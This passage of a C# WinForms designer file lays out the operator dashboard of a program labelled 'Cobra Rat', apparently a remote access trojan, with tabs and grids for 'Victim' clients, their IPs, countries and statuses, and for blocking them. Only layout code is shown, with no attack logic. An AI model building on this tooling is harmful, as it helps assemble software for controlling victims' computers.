		dataGridViewCellStyle24.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle24.ForeColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle24.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle24.SelectionForeColor = System.Drawing.Color.Black;
		this.DGVblocked.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle24;
		this.DGVblocked.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
		this.DGVblocked.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
		this.DGVblocked.BackgroundColor = System.Drawing.Color.Black;
		this.DGVblocked.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
		dataGridViewCellStyle25.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle25.BackColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle25.Font = new System.Drawing.Font("Calibri", 12f);
		dataGridViewCellStyle25.ForeColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle25.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle25.SelectionForeColor = System.Drawing.Color.Black;
		dataGridViewCellStyle25.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGVblocked.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle25;
		this.DGVblocked.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.DGVblocked.Columns.AddRange(this.DataGridViewImageColumn1, this.DataGridViewTextBoxColumn1);
		this.DGVblocked.ContextMenuStrip = this.ctxconnection;
		this.DGVblocked.Cursor = System.Windows.Forms.Cursors.Hand;
		dataGridViewCellStyle26.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle26.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle26.Font = new System.Drawing.Font("Calibri", 12f);
		dataGridViewCellStyle26.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle26.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle26.SelectionForeColor = System.Drawing.Color.FromArgb(10, 0, 10);
		dataGridViewCellStyle26.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.DGVblocked.DefaultCellStyle = dataGridViewCellStyle26;
		this.DGVblocked.Dock = System.Windows.Forms.DockStyle.Fill;
		this.DGVblocked.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
		this.DGVblocked.EnableHeadersVisualStyles = false;
		this.DGVblocked.GridColor = System.Drawing.Color.SkyBlue;
		this.DGVblocked.Location = new System.Drawing.Point(0, 0);
		this.DGVblocked.MultiSelect = false;
		this.DGVblocked.Name = "DGVblocked";
		this.DGVblocked.ReadOnly = true;
		this.DGVblocked.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
		dataGridViewCellStyle27.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle27.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle27.Font = new System.Drawing.Font("Calibri", 12f);
		dataGridViewCellStyle27.ForeColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle27.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle27.SelectionForeColor = System.Drawing.Color.FromArgb(10, 0, 10);
		dataGridViewCellStyle27.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGVblocked.RowHeadersDefaultCellStyle = dataGridViewCellStyle27;
		this.DGVblocked.RowHeadersVisible = false;
		dataGridViewCellStyle28.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle28.ForeColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle28.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle28.SelectionForeColor = System.Drawing.Color.FromArgb(10, 0, 10);
		this.DGVblocked.RowsDefaultCellStyle = dataGridViewCellStyle28;
		this.DGVblocked.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.DGVblocked.ShowCellToolTips = false;
		this.DGVblocked.Size = new System.Drawing.Size(1065, 536);
		this.DGVblocked.TabIndex = 2;
		this.DGVblocked.Tag = "b";
		this.DataGridViewImageColumn1.FillWeight = 50.76142f;
		this.DataGridViewImageColumn1.HeaderText = "Cobra Flag";
		this.DataGridViewImageColumn1.Name = "DataGridViewImageColumn1";
		this.DataGridViewImageColumn1.ReadOnly = true;
		this.DataGridViewTextBoxColumn1.FillWeight = 149.2386f;
		this.DataGridViewTextBoxColumn1.HeaderText = "Cobra Ip";
		this.DataGridViewTextBoxColumn1.Name = "DataGridViewTextBoxColumn1";
		this.DataGridViewTextBoxColumn1.ReadOnly = true;
		this.ctxconnection.BackColor = System.Drawing.Color.Black;
		this.ctxconnection.Font = new System.Drawing.Font("Calibri", 12f);
		this.ctxconnection.ImageScalingSize = new System.Drawing.Size(20, 20);
		this.ctxconnection.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { this.BlockClientToolStripMenuItem });
		this.ctxconnection.Name = "ctxconnection";
		this.ctxconnection.RenderMode = System.Windows.Forms.ToolStripRenderMode.System;
		this.ctxconnection.Size = new System.Drawing.Size(195, 46);
		this.BlockClientToolStripMenuItem.ForeColor = System.Drawing.Color.SkyBlue;
		this.BlockClientToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("BlockClientToolStripMenuItem.Image");
		this.BlockClientToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.BlockClientToolStripMenuItem.Name = "BlockClientToolStripMenuItem";
		this.BlockClientToolStripMenuItem.Size = new System.Drawing.Size(194, 42);
		this.BlockClientToolStripMenuItem.Text = "UNBlock Client";
		this.Panel9.Controls.Add(this.addpo);
		this.Panel9.Controls.Add(this.toblocktext);
		this.Panel9.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.Panel9.Location = new System.Drawing.Point(0, 536);
		this.Panel9.Margin = new System.Windows.Forms.Padding(2);
		this.Panel9.Name = "Panel9";
		this.Panel9.Size = new System.Drawing.Size(1065, 33);
		this.Panel9.TabIndex = 3;
		this.addpo.AvatarSize = 30;
		this.addpo.BackColor = System.Drawing.Color.Transparent;
		this.addpo.Cursor = System.Windows.Forms.Cursors.Hand;
		this.addpo.Dock = System.Windows.Forms.DockStyle.Right;
		this.addpo.FillColor = System.Drawing.Color.Black;
		this.addpo.Font = new System.Drawing.Font("Calibri", 12f);
		this.addpo.ForeColor = System.Drawing.Color.SkyBlue;
		this.addpo.Location = new System.Drawing.Point(1039, 0);
		this.addpo.Name = "addpo";
		this.addpo.Size = new System.Drawing.Size(26, 33);
		this.addpo.Style = DrakeUI.Framework.UIStyle.Custom;
		this.addpo.StyleCustomMode = true;
		this.addpo.Symbol = 61525;
		this.addpo.SymbolSize = 30;
		this.addpo.TabIndex = 45;
		this.addpo.Text = "DrakeUIAvatar1";
		this.ToolTips.SetToolTip(this.addpo, "Add to Block");
		this.toblocktext.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.toblocktext.FillColor = System.Drawing.Color.Black;
		this.toblocktext.Font = new System.Drawing.Font("Calibri", 12f);
		this.toblocktext.ForeColor = System.Drawing.Color.SkyBlue;
		this.toblocktext.Location = new System.Drawing.Point(907, 4);
		this.toblocktext.Margin = new System.Windows.Forms.Padding(4);
		this.toblocktext.Maximum = 2147483647.0;
		this.toblocktext.Minimum = -2147483648.0;
		this.toblocktext.Name = "toblocktext";
		this.toblocktext.Padding = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.toblocktext.Radius = 10;
		this.toblocktext.RectColor = System.Drawing.Color.SkyBlue;
		this.toblocktext.RectDisableColor = System.Drawing.Color.SkyBlue;
		this.toblocktext.Size = new System.Drawing.Size(140, 27);
		this.toblocktext.Style = DrakeUI.Framework.UIStyle.Custom;
		this.toblocktext.StyleCustomMode = true;
		this.toblocktext.TabIndex = 44;
		this.toblocktext.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.toblocktext.Watermark = "IP Address";
		this.connectionpanel.Controls.Add(this.DataLog);
		this.connectionpanel.Controls.Add(this.Panel11);
		this.connectionpanel.Dock = System.Windows.Forms.DockStyle.Fill;
		this.connectionpanel.FillColor = System.Drawing.Color.SkyBlue;
		this.connectionpanel.Font = new System.Drawing.Font("Calibri", 12f);
		this.connectionpanel.ForeColor = System.Drawing.Color.SkyBlue;
		this.connectionpanel.Location = new System.Drawing.Point(124, 34);
		this.connectionpanel.Margin = new System.Windows.Forms.Padding(4);
		this.connectionpanel.Name = "connectionpanel";
		this.connectionpanel.RectColor = System.Drawing.Color.Black;
		this.connectionpanel.Size = new System.Drawing.Size(1065, 569);
		this.connectionpanel.Style = DrakeUI.Framework.UIStyle.Custom;
		this.connectionpanel.TabIndex = 14;
		this.connectionpanel.Text = "New IP";
		this.connectionpanel.TitleColor = System.Drawing.Color.Black;
		this.connectionpanel.TitleHeight = 0;
		this.DataLog.AccessibleRole = System.Windows.Forms.AccessibleRole.None;
		this.DataLog.AllowUserToAddRows = false;
		this.DataLog.AllowUserToDeleteRows = false;
		this.DataLog.AllowUserToResizeColumns = false;
		this.DataLog.AllowUserToResizeRows = false;
		dataGridViewCellStyle29.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle29.ForeColor = System.Drawing.Color.Cyan;
		dataGridViewCellStyle29.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle29.SelectionForeColor = System.Drawing.Color.Black;
		this.DataLog.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle29;
		this.DataLog.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
		this.DataLog.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
		this.DataLog.BackgroundColor = System.Drawing.Color.Black;
		this.DataLog.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
		dataGridViewCellStyle30.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle30.BackColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle30.Font = new System.Drawing.Font("Calibri", 12f);
		dataGridViewCellStyle30.ForeColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle30.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle30.SelectionForeColor = System.Drawing.Color.Black;
		dataGridViewCellStyle30.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DataLog.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle30;
		this.DataLog.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.DataLog.Columns.AddRange(this.DataGridViewImageColumn2, this.DataGridViewTextBoxColumn5, this.DataGridViewTextBoxColumn4, this.DataGridViewTextBoxColumn7, this.dattim);
		this.DataLog.ContextMenuStrip = this.blockctx;
		this.DataLog.Cursor = System.Windows.Forms.Cursors.Hand;
		dataGridViewCellStyle31.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle31.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle31.Font = new System.Drawing.Font("Calibri", 12f);
		dataGridViewCellStyle31.ForeColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle31.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle31.SelectionForeColor = System.Drawing.Color.FromArgb(10, 0, 10);
		dataGridViewCellStyle31.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.DataLog.DefaultCellStyle = dataGridViewCellStyle31;
		this.DataLog.Dock = System.Windows.Forms.DockStyle.Fill;
		this.DataLog.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
		this.DataLog.EnableHeadersVisualStyles = false;
		this.DataLog.GridColor = System.Drawing.Color.SkyBlue;
		this.DataLog.Location = new System.Drawing.Point(0, 35);
		this.DataLog.MultiSelect = false;
		this.DataLog.Name = "DataLog";
		this.DataLog.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
		dataGridViewCellStyle32.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle32.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle32.Font = new System.Drawing.Font("Calibri", 12f);
		dataGridViewCellStyle32.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle32.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle32.SelectionForeColor = System.Drawing.Color.FromArgb(10, 0, 10);
		dataGridViewCellStyle32.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DataLog.RowHeadersDefaultCellStyle = dataGridViewCellStyle32;
		this.DataLog.RowHeadersVisible = false;
		dataGridViewCellStyle33.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle33.ForeColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle33.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle33.SelectionForeColor = System.Drawing.Color.FromArgb(10, 0, 10);
		this.DataLog.RowsDefaultCellStyle = dataGridViewCellStyle33;
		this.DataLog.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.DataLog.ShowCellToolTips = false;
		this.DataLog.Size = new System.Drawing.Size(1065, 534);
		this.DataLog.TabIndex = 2;
		this.DataLog.Tag = "b";
		this.DataLog.Visible = false;
		this.DataGridViewImageColumn2.HeaderText = "Cobra Flag";
		this.DataGridViewImageColumn2.Name = "DataGridViewImageColumn2";
		this.DataGridViewTextBoxColumn5.HeaderText = "Cobra Ip";
		this.DataGridViewTextBoxColumn5.Name = "DataGridViewTextBoxColumn5";
		this.DataGridViewTextBoxColumn4.HeaderText = "Cobra Country";
		this.DataGridViewTextBoxColumn4.Name = "DataGridViewTextBoxColumn4";
		this.DataGridViewTextBoxColumn7.HeaderText = "Cobra ClientStatus";
		this.DataGridViewTextBoxColumn7.Name = "DataGridViewTextBoxColumn7";
		this.dattim.HeaderText = "Cobra Client Date";
		this.dattim.Name = "dattim";
		this.blockctx.BackColor = System.Drawing.Color.Black;
		this.blockctx.Font = new System.Drawing.Font("Calibri", 12f);
		this.blockctx.ImageScalingSize = new System.Drawing.Size(20, 20);
		this.blockctx.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { this.ToolStripMenuItem1 });
		this.blockctx.Name = "ctxconnection";
		this.blockctx.RenderMode = System.Windows.Forms.ToolStripRenderMode.System;
		this.blockctx.Size = new System.Drawing.Size(175, 46);
		this.ToolStripMenuItem1.ForeColor = System.Drawing.Color.SkyBlue;
		this.ToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("ToolStripMenuItem1.Image");
		this.ToolStripMenuItem1.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.ToolStripMenuItem1.Name = "ToolStripMenuItem1";
		this.ToolStripMenuItem1.Size = new System.Drawing.Size(174, 42);
		this.ToolStripMenuItem1.Text = "Block Client";
		this.Panel11.Controls.Add(this.clearbtn);
		this.Panel11.Controls.Add(this.checkclearlogs);
		this.Panel11.Controls.Add(this.checkenablelogs);
		this.Panel11.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel11.Location = new System.Drawing.Point(0, 0);
		this.Panel11.Margin = new System.Windows.Forms.Padding(2);
		this.Panel11.Name = "Panel11";
		this.Panel11.Size = new System.Drawing.Size(1065, 35);
		this.Panel11.TabIndex = 3;
		this.clearbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.clearbtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.clearbtn.FillColor = System.Drawing.Color.Transparent;
		this.clearbtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.clearbtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.clearbtn.Location = new System.Drawing.Point(1039, 0);
		this.clearbtn.Name = "clearbtn";
		this.clearbtn.Padding = new System.Windows.Forms.Padding(3);
		this.clearbtn.Size = new System.Drawing.Size(26, 35);
		this.clearbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.clearbtn.StyleCustomMode = true;
		this.clearbtn.Symbol = 57469;
		this.clearbtn.SymbolSize = 30;
		this.clearbtn.TabIndex = 11;
		this.clearbtn.Text = "DrakeUIAvatar3";
		this.notifiform.SetToolTip(this.clearbtn, "Clear Logs");
		this.checkclearlogs.CheckBoxColor = System.Drawing.Color.SkyBlue;
		this.checkclearlogs.Checked = true;
		this.checkclearlogs.Cursor = System.Windows.Forms.Cursors.Hand;
		this.checkclearlogs.Font = new System.Drawing.Font("Calibri", 12f);
		this.checkclearlogs.ForeColor = System.Drawing.Color.SkyBlue;
		this.checkclearlogs.Location = new System.Drawing.Point(134, 7);
		this.checkclearlogs.Margin = new System.Windows.Forms.Padding(2);
		this.checkclearlogs.Name = "checkclearlogs";
		this.checkclearlogs.Padding = new System.Windows.Forms.Padding(16, 0, 0, 0);
		this.checkclearlogs.Size = new System.Drawing.Size(116, 22);
		this.checkclearlogs.Style = DrakeUI.Framework.UIStyle.Custom;
		this.checkclearlogs.StyleCustomMode = true;
		this.checkclearlogs.TabIndex = 1;
		this.checkclearlogs.Text = "Cobra Cleaner";
		this.checkenablelogs.CheckBoxColor = System.Drawing.Color.SkyBlue;
		this.checkenablelogs.Checked = true;
		this.checkenablelogs.Cursor = System.Windows.Forms.Cursors.Hand;
		this.checkenablelogs.Font = new System.Drawing.Font("Calibri", 12f);
		this.checkenablelogs.ForeColor = System.Drawing.Color.SkyBlue;
		this.checkenablelogs.Location = new System.Drawing.Point(8, 6);
		this.checkenablelogs.Margin = new System.Windows.Forms.Padding(2);
		this.checkenablelogs.Name = "checkenablelogs";
		this.checkenablelogs.Padding = new System.Windows.Forms.Padding(16, 0, 0, 0);
		this.checkenablelogs.Size = new System.Drawing.Size(116, 22);
		this.checkenablelogs.Style = DrakeUI.Framework.UIStyle.Custom;
		this.checkenablelogs.StyleCustomMode = true;
		this.checkenablelogs.TabIndex = 0;
		this.checkenablelogs.Text = "Enabled";
		this.TopPanel.BackColor = System.Drawing.Color.Black;
		this.TopPanel.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
		this.TopPanel.Controls.Add(this.blockbtn);
		this.TopPanel.Controls.Add(this.Connection_btn);
		this.TopPanel.Controls.Add(this.serversbtn);
		this.TopPanel.Controls.Add(this.notifiaisbtntop);
		this.TopPanel.Controls.Add(this.Clients_Btn);
		this.TopPanel.Controls.Add(this.DrakeUIButtonIcon2);
		this.TopPanel.Controls.Add(this.supportbtn);
		this.TopPanel.Controls.Add(this.DrakeUIButtonIcon13);
		this.TopPanel.Controls.Add(this.DrakeUIButtonIcon12);
		this.TopPanel.Controls.Add(this.Label1);
		this.TopPanel.Dock = System.Windows.Forms.DockStyle.Top;
		this.TopPanel.Location = new System.Drawing.Point(124, 0);
		this.TopPanel.Name = "TopPanel";
		this.TopPanel.Size = new System.Drawing.Size(1065, 34);
		this.TopPanel.TabIndex = 2;
		this.blockbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.blockbtn.Dock = System.Windows.Forms.DockStyle.Left;
		this.blockbtn.FillColor = System.Drawing.Color.Black;
		this.blockbtn.FillHoverColor = System.Drawing.Color.SkyBlue;
		this.blockbtn.FillPressColor = System.Drawing.Color.Black;
		this.blockbtn.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.blockbtn.Font = new System.Drawing.Font("Calibri", 9f);
		this.blockbtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.blockbtn.ForePressColor = System.Drawing.Color.SkyBlue;
		this.blockbtn.ImageAlign = System.Drawing.ContentAlignment.TopCenter;
		this.blockbtn.Location = new System.Drawing.Point(428, 0);
		this.blockbtn.Name = "blockbtn";
		this.blockbtn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.blockbtn.RectColor = System.Drawing.Color.Black;
		this.blockbtn.RectDisableColor = System.Drawing.Color.SkyBlue;
		this.blockbtn.RectHoverColor = System.Drawing.Color.SkyBlue;
		this.blockbtn.RectPressColor = System.Drawing.Color.SkyBlue;
		this.blockbtn.RectSelectedColor = System.Drawing.Color.SkyBlue;
		this.blockbtn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Top;
		this.blockbtn.ShowFocusLine = true;
		this.blockbtn.Size = new System.Drawing.Size(84, 34);
		this.blockbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.blockbtn.StyleCustomMode = true;
		this.blockbtn.Symbol = 61534;
		this.blockbtn.SymbolSize = 30;
		this.blockbtn.TabIndex = 41;
		this.blockbtn.Text = "FUCKED IP";
		this.blockbtn.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
		this.blockbtn.TipsText = "Home";
		this.Connection_btn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.Connection_btn.Dock = System.Windows.Forms.DockStyle.Left;
		this.Connection_btn.FillColor = System.Drawing.Color.Black;
		this.Connection_btn.FillHoverColor = System.Drawing.Color.SkyBlue;
		this.Connection_btn.FillPressColor = System.Drawing.Color.Black;
		this.Connection_btn.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.Connection_btn.Font = new System.Drawing.Font("Calibri", 9f);
		this.Connection_btn.ForeColor = System.Drawing.Color.SkyBlue;
		this.Connection_btn.ForePressColor = System.Drawing.Color.SkyBlue;
		this.Connection_btn.ImageAlign = System.Drawing.ContentAlignment.TopCenter;
		this.Connection_btn.Location = new System.Drawing.Point(344, 0);
		this.Connection_btn.Name = "Connection_btn";
		this.Connection_btn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.Connection_btn.RectColor = System.Drawing.Color.Black;
		this.Connection_btn.RectDisableColor = System.Drawing.Color.SkyBlue;
		this.Connection_btn.RectHoverColor = System.Drawing.Color.SkyBlue;
		this.Connection_btn.RectPressColor = System.Drawing.Color.SkyBlue;
		this.Connection_btn.RectSelectedColor = System.Drawing.Color.SkyBlue;
		this.Connection_btn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Top;
		this.Connection_btn.ShowFocusLine = true;
		this.Connection_btn.Size = new System.Drawing.Size(84, 34);
		this.Connection_btn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.Connection_btn.StyleCustomMode = true;
		this.Connection_btn.Symbol = 61926;
		this.Connection_btn.SymbolSize = 30;
		this.Connection_btn.TabIndex = 42;
		this.Connection_btn.Text = "New IP";
		this.Connection_btn.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
		this.Connection_btn.TipsText = "Home";
		this.serversbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.serversbtn.Dock = System.Windows.Forms.DockStyle.Left;
		this.serversbtn.FillColor = System.Drawing.Color.Black;
		this.serversbtn.FillHoverColor = System.Drawing.Color.SkyBlue;
		this.serversbtn.FillPressColor = System.Drawing.Color.Black;
		this.serversbtn.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.serversbtn.Font = new System.Drawing.Font("Calibri", 9f);
		this.serversbtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.serversbtn.ForePressColor = System.Drawing.Color.SkyBlue;
		this.serversbtn.ImageAlign = System.Drawing.ContentAlignment.TopCenter;
		this.serversbtn.Location = new System.Drawing.Point(260, 0);
		this.serversbtn.Name = "serversbtn";
		this.serversbtn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.serversbtn.RectColor = System.Drawing.Color.Black;
		this.serversbtn.RectDisableColor = System.Drawing.Color.SkyBlue;
		this.serversbtn.RectHoverColor = System.Drawing.Color.SkyBlue;
		this.serversbtn.RectPressColor = System.Drawing.Color.SkyBlue;
		this.serversbtn.RectSelectedColor = System.Drawing.Color.SkyBlue;
		this.serversbtn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Top;
		this.serversbtn.Size = new System.Drawing.Size(84, 34);
		this.serversbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.serversbtn.Symbol = 61451;
		this.serversbtn.SymbolSize = 30;
		this.serversbtn.TabIndex = 45;
		this.serversbtn.Text = "Add Port";
		this.serversbtn.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
		this.notifiaisbtntop.Cursor = System.Windows.Forms.Cursors.Hand;
		this.notifiaisbtntop.Dock = System.Windows.Forms.DockStyle.Left;
		this.notifiaisbtntop.FillColor = System.Drawing.Color.Black;
		this.notifiaisbtntop.FillHoverColor = System.Drawing.Color.SkyBlue;
		this.notifiaisbtntop.FillPressColor = System.Drawing.Color.Black;
		this.notifiaisbtntop.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.notifiaisbtntop.Font = new System.Drawing.Font("Calibri", 9f);
		this.notifiaisbtntop.ForeColor = System.Drawing.Color.SkyBlue;
		this.notifiaisbtntop.ForePressColor = System.Drawing.Color.SkyBlue;
		this.notifiaisbtntop.ImageAlign = System.Drawing.ContentAlignment.TopCenter;
		this.notifiaisbtntop.Location = new System.Drawing.Point(176, 0);
		this.notifiaisbtntop.Name = "notifiaisbtntop";
		this.notifiaisbtntop.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.notifiaisbtntop.RectColor = System.Drawing.Color.Black;
		this.notifiaisbtntop.RectDisableColor = System.Drawing.Color.SkyBlue;
		this.notifiaisbtntop.RectHoverColor = System.Drawing.Color.SkyBlue;
		this.notifiaisbtntop.RectPressColor = System.Drawing.Color.SkyBlue;
		this.notifiaisbtntop.RectSelectedColor = System.Drawing.Color.SkyBlue;
		this.notifiaisbtntop.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Top;
		this.notifiaisbtntop.Size = new System.Drawing.Size(84, 34);
		this.notifiaisbtntop.Style = DrakeUI.Framework.UIStyle.Custom;
		this.notifiaisbtntop.Symbol = 61683;
		this.notifiaisbtntop.SymbolSize = 30;
		this.notifiaisbtntop.TabIndex = 44;
		this.notifiaisbtntop.Text = "Alert";
		this.notifiaisbtntop.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
		this.Clients_Btn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.Clients_Btn.Dock = System.Windows.Forms.DockStyle.Left;
		this.Clients_Btn.FillColor = System.Drawing.Color.Black;
		this.Clients_Btn.FillHoverColor = System.Drawing.Color.SkyBlue;
		this.Clients_Btn.FillPressColor = System.Drawing.Color.Black;
		this.Clients_Btn.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.Clients_Btn.Font = new System.Drawing.Font("Calibri", 9f);
		this.Clients_Btn.ForeColor = System.Drawing.Color.SkyBlue;
		this.Clients_Btn.ForePressColor = System.Drawing.Color.SkyBlue;
		this.Clients_Btn.ImageAlign = System.Drawing.ContentAlignment.TopCenter;
		this.Clients_Btn.Location = new System.Drawing.Point(92, 0);
		this.Clients_Btn.Name = "Clients_Btn";
		this.Clients_Btn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.Clients_Btn.RectColor = System.Drawing.Color.Black;
		this.Clients_Btn.RectDisableColor = System.Drawing.Color.SkyBlue;
		this.Clients_Btn.RectHoverColor = System.Drawing.Color.SkyBlue;
		this.Clients_Btn.RectPressColor = System.Drawing.Color.SkyBlue;
		this.Clients_Btn.RectSelectedColor = System.Drawing.Color.SkyBlue;
		this.Clients_Btn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Top;
		this.Clients_Btn.ShowFocusLine = true;
		this.Clients_Btn.Size = new System.Drawing.Size(84, 34);
		this.Clients_Btn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.Clients_Btn.StyleCustomMode = true;
		this.Clients_Btn.Symbol = 61447;
		this.Clients_Btn.SymbolSize = 30;
		this.Clients_Btn.TabIndex = 40;
		this.Clients_Btn.Text = "Victim";
		this.Clients_Btn.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
		this.Clients_Btn.TipsText = "Home";
		this.Home_Btn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.Home_Btn.Dock = System.Windows.Forms.DockStyle.Left;
		this.Home_Btn.FillColor = System.Drawing.Color.Black;
		this.Home_Btn.FillHoverColor = System.Drawing.Color.SkyBlue;
		this.Home_Btn.FillPressColor = System.Drawing.Color.Black;
		this.Home_Btn.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.Home_Btn.Font = new System.Drawing.Font("Calibri", 9f);
		this.Home_Btn.ForeColor = System.Drawing.Color.SkyBlue;
		this.Home_Btn.ForePressColor = System.Drawing.Color.SkyBlue;
		this.Home_Btn.ImageAlign = System.Drawing.ContentAlignment.TopCenter;
		this.Home_Btn.Location = new System.Drawing.Point(8, 0);
		this.Home_Btn.Name = "Home_Btn";
		this.Home_Btn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.Home_Btn.RectColor = System.Drawing.Color.Black;
		this.Home_Btn.RectDisableColor = System.Drawing.Color.SkyBlue;
		this.Home_Btn.RectHoverColor = System.Drawing.Color.SkyBlue;
		this.Home_Btn.RectPressColor = System.Drawing.Color.SkyBlue;
		this.Home_Btn.RectSelectedColor = System.Drawing.Color.SkyBlue;
		this.Home_Btn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Top;
		this.Home_Btn.ShowFocusLine = true;
		this.Home_Btn.Size = new System.Drawing.Size(84, 34);
		this.Home_Btn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.Home_Btn.StyleCustomMode = true;
		this.Home_Btn.Symbol = 57460;
		this.Home_Btn.SymbolSize = 30;
		this.Home_Btn.TabIndex = 16;
		this.Home_Btn.Text = "Cobra Rat";
